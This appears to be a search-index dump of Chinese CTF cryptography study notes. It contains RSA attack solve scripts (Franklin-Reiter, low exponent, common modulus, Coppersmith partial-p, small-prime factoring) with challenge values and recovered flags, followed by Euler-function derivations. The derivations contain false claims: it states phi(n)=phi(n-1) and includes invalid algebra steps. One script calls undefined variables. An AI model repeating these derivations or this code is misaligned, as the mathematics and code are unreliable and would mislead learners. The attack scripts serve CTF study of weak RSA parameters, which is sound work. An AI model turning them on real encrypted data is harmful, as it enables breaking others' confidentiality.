u56e0\u4e3akey2 \u5c0f\u4e8e key1 \u9700\u8981\u66ff\u6362\u4e0bc2 \u548c c1 \u7684\u4f4d\u7f6e <pre><code>def franklinReiter(n,e,c1,c2,x1,y1):\n    R.&lt;X&gt; = Zmod(n)[]\n    f1 = X^e - c2\n    f2 = (X*x1+ y1)^e - c1\n    # coefficient 0 = -m, which is what we wanted!\n    return Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[0])\n\n  # GCD is not implemented for rings over composite modulus in Sage\n  # so we do our own implementation. Its the exact same as standard GCD, but with\n  # the polynomials monic representation\ndef compositeModulusGCD(a, b):\n    if(b == 0):\n        return a.monic()\n    else:\n        return compositeModulusGCD(b, a % b)\n\nn=18099247369280154886617000375109767499806054172740063389012130770186820932961360864498732850525922466534945118800932145228805671351976586517097622365680011651402327925464073182713293531130034756251505774357417055627671229271867926990490595666312835905910514734764729504786992310448996071206128488211439271233843142630939565246707372296583601804184804171689260854956262942235631405717696974169377626396323676395636456740120025184398476594314662368359312356066266921270189494622506635066969735080655725839847984616974215284857408784397344862523720171616739915198953492024993048307867785945156942213152962536432345964739\nc1=12278575945470897872640453814770538959516698979717179227690510266529921428552864312660132740788416401327102285180588038083079258311881620201133998229854752124927460819177711379328404288010908880844043596472423294384267295041524633599162192148584399505960857935034928148929492625945646997837039619205559476017169925713468855198646629226970777687397537720214045661626920833445827989359857671018875074072055022703115700566419215341376615131689314020746375076743801434662693872661942545103307966098491064656551141436523806773529181866000500420523710554658948977262516303583655752676734847641890080943847492535926834052488\nc2=17408296326028739312453312633484317596943826388625453121732287745283275892186527757287755028016444735036842917880385034442965065523813174163945799579491327454221196284056233455567244848717704030947162883942273297422509937269431814260733969129102074843485655311252111459010777945499431139524012532947251982056639653098247711079544046418704543343537501388589717979520036378098389654456014224822916973106504500942515154126504282811270117380780048894037581126326329800132358724785374395728605324605424194037625702457971360093340866984155213328508506733775129948622882145937096019437059787874064306250117133787681357927186\nx=94819009910611490937147710332193973830402125343380796\ny=27036298270176650012154148050982037588069778308019261952420224460786523779956477136773576099293451667012578253132502506974471829679519804802324747292357969625762476160905899712303273534268489228000459887114964986912314483751635173113737622875478746013228230937327043213246022641974495178269021953810671692021\ne=3\nkey2=franklinReiter(n,e,c1,c2,x1,y1)\nprint(key2)\nprint(key2*x1+y1)\n#6888963054258642613740325434330669608753226058634053294961493623175402123423076765486521793459129361281449088315708197565085083193444886554420466104040516489271824213587620932188993548052848705998448234910002066319419375438874205309976091920990411697914875778848108746628535295745926285102414338027810783987711072435382043887546827768330700843751035424140257393\n#flag{98dd715f2e03fe16}\n</code></pre></p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P19.Franklin-Reiter%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/#2","title":"\u9898\u76ee2","text":"<pre><code>from secret import flag\nfrom Crypto.Util.number import *\n\nm1 = bytes_to_long(flag)\nN = getPrime(512)*getPrime(512)\ne = 17\n\nc1 = pow(m1, e, N)\n\na = getRandomNBitInteger(512)\nb = getRandomNBitInteger(512)\nm2 = a*m1 + b\nc2 = pow(m2, e, N)\n\nprint(N, a, b, c1, c2, sep=\"\\n\")\n\nn=51296885372346449295388453471330409021784141081351581975478435681552082076338697136130122011636685327781785488670769096434920591920054441921039812310126089859349902066456998315283909435249794317277620588552441456327265553018986591779396701680997794937951231970194353001576159809798153970829987274504038146741\na=13256631249970000274738888132534852767685499642889351632072622194777502848070957827974250425805779856662241409663031192870528911932663995606616763982320967\n\nb=12614470377409090738391280373352373943201882741276992121990944593827605866548572392808272414120477304486154096358852845785437999246453926812759725932442170\n\n\n\nc1=18617698095122597355752178584860764221736156139844401400942959000560180868595058572264330257490645079792321778926462300410653970722619332098601515399526245808718518153518824404167374361098424325296872587362792839831578589407441739040578339310283844080111189381106274103089079702496168766831316853664552253142\nc2=14091361528414093900688440242152327115109256507133728799758289918462970724109343410464537203689727409590796472177295835710571700501895484300979622506298961999001641059179449655629481072402234965831697915939034769804437452528921599125823412464950939837343822566667533463393026895985173157447434429906021792720\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P19.Franklin-Reiter%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/#_3","title":"\u89e3\u9898\u811a\u672c","text":"<pre><code>def franklinReiter(n,e,c1,c2,a,b):\n    R.&lt;X&gt; = Zmod(n)[]\n    f1 = X^e - c1\n    f2 = (X*a+ b)^e - c2\n    # coefficient 0 = -m, which is what we wanted!\n    return Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[0])\n\n  # GCD is not implemented for rings over composite modulus in Sage\n  # so we do our own implementation. Its the exact same as standard GCD, but with\n  # the polynomials monic representation\ndef compositeModulusGCD(a, b):\n    if(b == 0):\n        return a.monic()\n    else:\n        return compositeModulusGCD(b, a % b)\n\nn=51296885372346449295388453471330409021784141081351581975478435681552082076338697136130122011636685327781785488670769096434920591920054441921039812310126089859349902066456998315283909435249794317277620588552441456327265553018986591779396701680997794937951231970194353001576159809798153970829987274504038146741\na=13256631249970000274738888132534852767685499642889351632072622194777502848070957827974250425805779856662241409663031192870528911932663995606616763982320967\nb=12614470377409090738391280373352373943201882741276992121990944593827605866548572392808272414120477304486154096358852845785437999246453926812759725932442170\nc1=18617698095122597355752178584860764221736156139844401400942959000560180868595058572264330257490645079792321778926462300410653970722619332098601515399526245808718518153518824404167374361098424325296872587362792839831578589407441739040578339310283844080111189381106274103089079702496168766831316853664552253142\nc2=14091361528414093900688440242152327115109256507133728799758289918462970724109343410464537203689727409590796472177295835710571700501895484300979622506298961999001641059179449655629481072402234965831697915939034769804437452528921599125823412464950939837343822566667533463393026895985173157447434429906021792720\ne=17\n\nm=franklinReiter(n,e,c1,c2,a,b)\nprint(m)\nprint(hex(m))\n#0x666c61677b61353933353931612d333734392d636335322d306332372d6538393766616332633936377d\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/","title":"P99 \u96f6\u6563\u77e5\u8bc6\u70b9","text":"<p> \u7ea6 378 \u4e2a\u5b57  170 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#p99","title":"P99 \u96f6\u6563\u77e5\u8bc6\u70b9","text":"<p>\u9ad8\u4f4d\u653b\u51fb <pre><code>from gmpy2 import *\nfrom Crypto.Util.number import *\ndef low_exponent(n,e,c):\n    k=0\n    while True:\n        a=iroot(c+k*n,e)\n        if a[1]:\n            return long_to_bytes(a[0])\n        k+=1\n\ndef Common_modulus(e1,e2,n,c1,c2):\n    _,r,s=gcdext(e1,e2)\n    m=pow(c1,r,n)*pow(c2,s,n) %n\n    return long_to_bytes(m)\n\ndef Partial_p(n,e,c,pbar,kbits):\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    f = x + pbar\n    x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.4\n    p = x0 + pbar\n    q = n // int(p)\n    d = inverse_mod(e, (p-1)*(q-1))\n    return long_to_bytes(pow(c, d, n))\n\nc=19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893\nn=123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009\ne=3\nmsg1=low_exponent(n,e,c)\n\nc1=54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610\nc2=91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950\ne1=17\ne2=65537\nn=111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977\nmsg2=Common_modulus(e1,e2,n,c1,c2)\n\nkbits=200\npbar=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902*2^200\nn=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147\ne=65537\nc=59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646\nmsg3=Partial_p(n,e,c,pbar,kbits)\n\nmsg=msg1+msg2+msg3\nimport hashlib\nprint(\"CISCN{\"+hashlib.md5(msg).hexdigest()+\"}\")\n</code></pre></p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#_1","title":"\u79bb\u6563\u5bf9\u6570","text":"<pre><code>\u5982\u679c\u5bf9\u4e8e\u4e00\u4e2a\u6574\u6570b\u548c\u8d28\u6570p\u7684\u4e00\u4e2a\u539f\u6839a\uff0c\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6307\u6570i\uff0c\u4f7f\u5f97\uff1a\n\nb=a**i%p \u5176\u4e2d 0&lt;i&lt;p-1 \u6210\u7acb\uff0c\u90a3\u4e48\u6307\u6570i\u79f0\u4e3ab\u7684\u4ee5a\u4e3a\u57fa\u6570\u7684\u6a21p\u7684\u79bb\u6563\u5bf9\u6570\u3002\n\n\u79bb\u6563\u5bf9\u6570\u96be\u9898\u662f\u6307\uff1a\u5f53\u5df2\u77e5\u4e00\u4e2a\u5927\u8d28\u6570p\u548c\u5b83\u7684\u4e00\u4e2a\u539f\u6839a\uff0c\u5982\u679c\u7ed9\u5b9a\u4e00\u4e2ab\uff0c\u8981\u8ba1\u7b97i\u7684\u503c\u662f\u76f8\u5f53\u56f0\u96be\u7684\u3002\n\ne=sympy.discrete_log(n,c,m)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#_2","title":"\u6574\u6570\u548c\u5b57\u7b26\u4e32\u4e92\u8f6c","text":"<pre><code>#pip install pycryptodome\n\nfrom Crypto.Util.number import long_to_bytes,bytes_to_long\nprint(bytes_to_long(\"123\".encode()))\nprint(long_to_bytes(3224115).decode())\n</code></pre> <pre><code>import libnum\nprint(libnum.s2n(\"123\"))\nprint(libnum.n2s(3224115).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#_3","title":"\u8ba1\u7b97","text":"<pre><code>import libnum\nimport gmpy2\n#\u6c42\u9006\u5143\nlibnum.invmod(5, 26)\ngmpy2.invert(5, 26)\n\n#\u6c42\u6700\u5927\u516c\u7ea6\u6570\nlibnum.gcd(2,4)\ngmpy2.gcd(2, 4)\n\n#\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u6c42\u9006\u5143\nlibnum.xgcd(5, 26)  # xgcd(a,b)\u8fd4\u56de\uff1ax,y,g \uff1bax+by=g\ngmpy2.gcdext(5,26) # xgcd(a,b)\u8fd4\u56de\uff1ax,y,g \uff1bax+by=g\n\n#\u5f00\u51e0\u6b21\u65b9\u6839\nlibnum.nroot(16,2)\ngmpy2.iroot(16,2)\n\n#\u751f\u6210\u7d20\u6570\nlibnum.generate_prime(4)\nfrom Crypto.Util.number import getPrime\ngetPrime(30)\n\n#\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a\u7d20\u6570\ngmpy2.next_prime()\n#\u5224\u65ad\u662f\u5426\u4e3a\u7d20\u6570\ngmpy2.is_prime()\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#rsa","title":"rsa\u5e93","text":"<pre><code>import rsa\n(pubkey, privkey) = rsa.newkeys(1024)\nm = \"flag\".encode('utf-8')\nc=rsa.encrypt(m,pubkey)\nm=rsa.decrypt(c,privkey)\nprint(m)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#_4","title":"\u516c\u94a5\u6587\u4ef6\u67e5\u770b","text":"<pre><code>import rsa\nwith open('publickey.pem',mode='rb') as f:\n    keydata= f.read()\npubckey = rsa.PublicKey.load_pkcs1_openssl_pem(keydata)\npubckey.n\npubckey.e\n</code></pre> <pre><code>from Crypto.PublicKey import RSA\npath = '&lt;key file path here&gt;'\nwith open(path) as f:\n    key = RSA.import_key(f.read())\n    print('e = %d' % key.e)\n    print('n = %d' % key.n)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#_5","title":"\u6839\u636e\u79c1\u94a5\u6587\u4ef6\u8bfb\u53d6\u516c\u94a5\u52a0\u5bc6\u540e\u5bc6\u6587\u65b9\u5f0f","text":"<pre><code>import rsa\nprikey = rsa.PrivateKey(n , e , d , p , q)\nwith open(\"test.enc\" , \"rb\") as fp:\n    print(rsa.decrypt(fp.read(), prikey).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#_6","title":"\u79c1\u94a5","text":"<pre><code>import math\nimport sys\nfrom Crypto.PublicKey import RSA\n\nrsa_components=(n,e,int(d),p,q)\n\nkeypair=RSA.construct(rsa_components)\n\nprivate = open('private.pem', 'wb')\nprivate.write(keypair.exportKey())\nprivate.close()\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#pycryptodome","title":"pyCryptodome\u5e93","text":"<pre><code>from Crypto.Util import number\ns='this is a demo'\n#\u5b57\u8282\u8f6c\u6362\u4e3along\u578b\u6574\u6570\nls=number.bytes_to_long(s)\n\nbits=8*len(s)\n#\u751f\u6210\u957f\u5ea6\u4e3abits\u7684\u7d20\u6570\ngp=number.getPrime(bits)\n\n#\u751f\u6210\u957f\u5ea6\u5c0f\u4e8ebits\u7684\u968f\u673a\u6570\ngri=number.getRandomInteger(bits)\n\n#\u751f\u6210\u957f\u5ea6\u4e3abits\u7684\u968f\u673a\u6570\ngrnbi=number.getRandomNBitInteger(bits)\n\n#\u751f\u6210\u957f\u5ea6\u4e0d\u8d85\u8fc7bits\u7684\u968f\u673a\u6570\ngrn=number.getRandomNumber(bits)\n\n#\u751f\u6210grn\u4e0e2*grn\u4e4b\u95f4\u7684\u968f\u673a\u6570\ngrr=number.getRandomRange(grn,2*grn)\n\n#\u751f\u6210\u5f3a\u7684\u7d20\u6570\uff08gsp-1\uff0cgsp+1\u5747\u81f3\u5c11\u5177\u6709\u4e00\u4e2a\u5927\u7684\u7d20\u56e0\u5b50\uff09\ngsp=number.getStrongPrime(1024)\n\n#\u8ba1\u7b97gri\u5728\u6a21grn\u4e0b\u7684\u9006\niin=number.inverse(gri,grn)\n\n#\u5224\u65adiin\u662f\u5426\u4e3a\u7d20\u6570\nip=number.isPrime(iin)\n\n#long\u578b\u6574\u6570\u8f6c\u6362\u4e3a\u5b57\u8282\ntb=number.long_to_bytes(ls)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#sympy","title":"sympy","text":"<pre><code>sympy.prime(n)\u8fd4\u56de\u7b2cn\u4e2a\u7d20\u6570\n\nsympy.isprime(n)\u7d20\u6027\u68c0\u6d4b\n\nsympy.primepi(n)\u8fd4\u56de\u5c0f\u4e8en\u7684\u7d20\u6570\u7684\u603b\u6570\n\nsympy.nextprime(89)\u8fd4\u56de\u4e0b\u4e00\u4e2a\u7d20\u6570\uff0c\u8fd9\u91cc\u7ed3\u679c\u662f97\n\nsympy.prevprime(96)\u6216sympy.prevprime(97)\u8fd4\u56de\u4e0a\u4e00\u4e2a\u7d20\u6570\uff0c\u7ed3\u679c\u90fd\u662f89\n\nsympy.randprime(1,30)\u8fd4\u56de1\u523030\u4e4b\u95f4\u7684\u4e00\u4e2a\u5927\u4e8e\u7b49\u4e8e1\u5c0f\u4e8e30\u7684\u968f\u673a\u7d20\u6570 range [a, b)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P99%20%E9%9B%B6%E6%95%A3%E7%9F%A5%E8%AF%86%E7%82%B9/#sage","title":"sage\u4e2d\u6c42\u89e3\u79bb\u6563\u5bf9\u6570","text":"<pre><code>https://blog.csdn.net/ckm1607011/article/details/106849551\n\nsage\u4e2d\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u6211\u76ee\u524d\u77e5\u9053\u7684\u56db\u4e2a\u51fd\u6570\uff1a\n\n(1)discrete_log\uff1a\u901a\u7528\u7684\u6c42\u79bb\u6563\u5bf9\u6570\u7684\u65b9\u6cd5\uff1adiscrete_log(a,base,ord,operation)\n\n(2)discrete_log_rho\uff1a\u6c42\u79bb\u6563\u5bf9\u6570\u7684Pollard-Rho\u7b97\u6cd5\uff1adiscrete_log_rho(a,base,ord,operation)\n\n(3)discrete_log_lambda\uff1a\u6c42\u79bb\u6563\u5bf9\u6570\u7684Pollard-kangaroo\u7b97\u6cd5\uff08\u4e5f\u79f0\u4e3alambda\u7b97\u6cd5\uff09\uff1adiscrete_log_lambda(a,base,bounds,operation)\n\n(4)bsgs\uff1a\u5c0f\u6b65\u5927\u6b65\u6cd5\uff1absgs(base,a,bounds,operation)\n</code></pre> <pre><code>\u6574\u4e2a\u5c31\u662f\u4e00\u4e2arsa\u52a0\u5bc6\uff0c\u9996\u5148\u4ea7\u751f256\u6bd4\u7279\u7684\u7d20\u6570p,q\uff0c\n\n\u5bf9\u4e8e10\u8fdb\u5236\u7684\u957f\u5ea6\u4e3a77\u6216\u800578\n\n\u7136\u540e\u5c06p,q\u5206\u522b\u62fc\u63a5\u4e3aP,Q\u3002\n\u4e5f\u5c31\u662f\u8bf4P={10}^xp+q,Q={10}^yq+p\uff0c\n\u5176\u4e2dx,y\u53d677\u621678\u3002\nN=PQ={10}^{(x+y)}pq+{10}^xp^2+{10}^yq^2+pq,\u8bben=pq\n\u9996\u5148x,y\\in[77,78]\u6240\u4ee5\u663e\u7136N\u7684\u4f4ez=min\\{x,y\\}\u5c31\u662fn\u7684\u4f4ez\u4f4d\u3002\n\u5176\u6b21pq,p^2,q^2\u662f\u4e00\u4e2a\u91cf\u7ea7\u7684\uff0c\u800c{10}^{(x+y)}\u8db3\u591f\u5927\uff0c\u6240\u4ee5N\u7684\u9ad8z\\in[76,77,78]\u5373\u4e3an\u7684\u9ad8z\u4f4d\n\u5e76\u4e14n\u7684\u957f\u5ea6l\\in[154,155,156]\uff0c\u6240\u4ee5\u8bf4\u4e00\u822c\u53ea\u6709\u4e2d\u95f4\u4e00\u5230\u4e24\u4f4d\u672a\u77e5\uff0c\u76f4\u63a5\u7206\u7834\u6c42\u5230n\n\u7136\u540e\u5e26\u56deN={10}^{(x+y)}pq+{10}^xp^2+{10}^yq^2+pq\u5f97\u5230\u4e00\u4e2a\u4e00\u5143\u56db\u6b21\u65b9\u7a0b:\nf(q)={10}^yq^4+n({10}^{(x+y)}+1)q^2+{10}^xn^2=0\u76f4\u63a5\u5229\u7528\u6c42\u6839\u516c\u5f0f\u89e3\u5373\u53ef\u3002\n</code></pre> \\[ \\sum_{\\mathclap{1\\le i\\le j\\le n}} x_{ij } \\]"},{"location":"02RSA/","title":"\u524d\u8a00","text":"<p> \u7ea6 10 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u8fd9\u90e8\u5206\u8fd8\u6ca1\u60f3\u597d\u5199\u4ec0\u4e48</p>"},{"location":"02RSA/knowledge_record/","title":"\u4e00\u4e9b\u77e5\u8bc6\u7684\u8bb0\u5f55","text":""},{"location":"02RSA/knowledge_record/#_1","title":"\u6765\u70b9\u6b27\u62c9\u51fd\u6570\u7684\u77e5\u8bc6","text":"<p>\u6b27\u62c9\u51fd\u6570\u7684\u5b9a\u4e49\u5f0f\u4e3a\uff1a </p> \\[ \\phi(n) = { a | 1 \\leq a \\leq n, \\gcd(a,n) = 1 } \\] <p>\u5f53n\u4e3a\u8d28\u6570\u65f6\uff0c\\(phi(n) = n-1\\)</p> <p>\u5f53n\u4e3a\u5408\u6570\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b27\u62c9\u5b9a\u7406\u6765\u8ba1\u7b97\uff0c\u8868\u8fbe\u5f0f\u4e3a\uff1a </p> \\[ \\phi(n) = n \\prod_{i=1}^{k}(1- \\frac{1}{p_i})  \\] <p>\u5176\u4e2d\\(n = p_1^{a_1} * p_2^{a_2} *...*p_k^{a_k}\\)</p> <p>\u6b27\u62c9\u5b9a\u7406\u5373 \\(\\phi(n) = n * (1- 1/p_1) * (1- 1/p_2) * ... * (1- 1/p_k)\\)</p> <p>\u6b27\u62c9\u51fd\u6570\u662f\u5bf9\u79f0\u7684\uff0c\u5373 \\(\\phi(n) = \\phi(n-1)\\)</p>"},{"location":"02RSA/knowledge_record/#_2","title":"\u6765\u770b\u4e24\u4e2a\u4f8b\u5b50\uff1a","text":""},{"location":"02RSA/knowledge_record/#nppqpqphin","title":"\u5df2\u77e5\\(n=p*p*q\\)\uff0cp\u548cq\u662f\u8d28\u6570\uff0c\u5199\u51faphi(n)\u7684\u8868\u8fbe\u5f0f","text":"<p>\u7531\u4e8e\\(n = p*p*q\\)\uff0c\u6240\u4ee5phi(n)\u53ef\u4ee5\u901a\u8fc7\u6b27\u62c9\u5b9a\u7406\u6765\u8ba1\u7b97\uff1a </p> \\[ \\phi(n) = n \\prod_{i=1}^{3}(1- \\frac{1}{p_i})  \\] <p>\u56e0\u4e3ap,q\u662f\u8d28\u6570\uff0c\u6240\u4ee5\\(phi(p^2) = p^2 - p,phi(q) = q - 1\\)</p> <p>\u6240\u4ee5 </p> \\[ \\phi(n) = n * (1- \\frac{1}{p})^2 * (1- \\frac{1}{q})  \\] \\[ \\phi(n) = (p*p*q) * (1- \\frac{1}{p})^2 * (1- \\frac{1}{q})  \\] \\[ \\phi(n) = (p*p*q) * (1- \\frac{2}{p}+\\frac{1}{p^2}) * (1- \\frac{1}{q})  \\] \\[ \\phi(n) = (p*p*q) * (\\frac{p^2-2p+1}{p^2}) * (\\frac{q-1}{q})  \\] \\[ \\phi(n) = (p*p*q) * (\\frac{p^2-p}{p^2}) * (\\frac{q-1}{q})  \\] \\[ \\phi(n) = (p*p*q-p*p*q) * (\\frac{p-1}{p}) * (\\frac{q-1}{q})  \\] \\[ \\phi(n) = (p-1)*p*(q-1)  \\] <p>\u6240\u4ee5   \\(\\quad phi(n) = (p-1)*p*(q-1)\\)</p>"},{"location":"02RSA/knowledge_record/#np3q4pqphin","title":"\u5df2\u77e5\\(n=(p^3)*(q^4)\\)\uff0cp\u548cq\u662f\u8d28\u6570\uff0c\u5199\u51faphi(n)\u7684\u8868\u8fbe\u5f0f","text":"<p>\u7531\u4e8e\\(n = (p^3)*(q^4)\\)\uff0c\u6240\u4ee5\\(phi(n)\\)\u53ef\u4ee5\u901a\u8fc7\u6b27\u62c9\u5b9a\u7406\u6765\u8ba1\u7b97\uff1a</p> \\[ \\phi(n) = n \\prod_{i=1}^{2}(1- \\frac{1}{p_i}) \\] <p>\u56e0\u4e3ap,q\u662f\u8d28\u6570\uff0c\u6240\u4ee5 \\(phi(p^3) = p^3 - p^2,phi(q^4) = q^4 - q^3\\)</p> <p>\u6240\u4ee5</p> \\[ \\phi(n) = (p^3)*(q^4) * (1- \\frac{1}{p})^3 * (1- \\frac{1}{q})^4  \\] \\[ \\phi(n) = (p^3)*(q^4) * (1- \\frac{3}{p}+\\frac{3}{p^2}-\\frac{1}{p^3}) * (1- \\frac{4}{q}+\\frac{6}{q^2}-\\frac{4}{q^3}+\\frac{1}{q^4})  \\] \\[ \\phi(n) = (p^3)*(q^4) * (\\frac{p^3-3p^2+3p-1}{p^3}) * (\\frac{q^4-4q^3+6q^2-4q+1}{q^4})  \\] \\[ \\phi(n) = (p^3)*(q^4) * (\\frac{p^3-p^2}{p^3}) * (\\frac{q^4-q^3}{q^4})  \\] \\[ \\phi(n) = (p^3)*(q^4) * (1-\\frac{1}{p}) * (1-\\frac{1}{q}) \\] \\[ \\phi(n) = (p^2)(q^3)(p-1)*(q-1)  \\] <p>\u6240\u4ee5 \\(\\quad phi(n) = (p^2)(q^3)(p-1)*(q-1)\\)</p> <p>\u4f8b\u9898</p> <p>SICTF 2023</p> <pre><code>from flag import flag\nimport libnum\nfrom Crypto.Util.number import getPrime\nm=libnum.s2n(flag)\nn=getPrime(16)\nfor i in range(233):\n    n*=getPrime(16)\ne=65537\nc=pow(m,e,n)\nprint(c)\nprint(n)\n'''\n44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492\n157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173\n'''\n</code></pre> <p>n\u4e2d\u6709\u8bb8\u591a\u91cd\u590d\u5c0f\u8d28\u6570</p> <p>\u7528sagemath\u7684euler_phi\u51fd\u6570\u5206\u89e3\u5373\u53ef</p> <pre><code>n = 157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173\nc = 44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492\ne = 65537\nphi = euler_phi(n)\nd = gmpy2.invert(e, phi)\nm = pow(c,d,n)\nprint(libnum.n2s(int(m)))\n\n# SICTF{13578a78-1bd1-483e-8c01-4d501c8b52bb}\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 448 \u4e2a\u5b57 :fontawesome-solid-code: 24 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 